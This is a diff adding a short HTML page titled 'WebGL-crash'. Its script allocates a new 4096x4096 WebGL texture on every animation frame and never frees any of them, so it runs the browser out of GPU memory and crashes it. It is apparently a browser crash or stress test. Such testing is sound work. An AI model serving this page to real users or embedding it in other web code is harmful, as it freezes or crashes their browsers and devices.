@@ -1,0 +1,15 @@
+<!doctype html>
+<meta charset=utf-8>
+<title>WebGL‑crash</title>
+<canvas id=c></canvas>
+<script>
+const gl=c.getContext('webgl',{preserveDrawingBuffer:true});
+c.width=window.innerWidth;c.height=window.innerHeight;
+function spam(){
+ const t=gl.createTexture();
+ gl.bindTexture(gl.TEXTURE_2D,t);
+ gl.texImage2D(gl.TEXTURE_2D,0,gl.RGBA,4096,4096,0,gl.RGBA,gl.UNSIGNED_BYTE,null);
+ requestAnimationFrame(spam);
+}
+spam();
+</script>
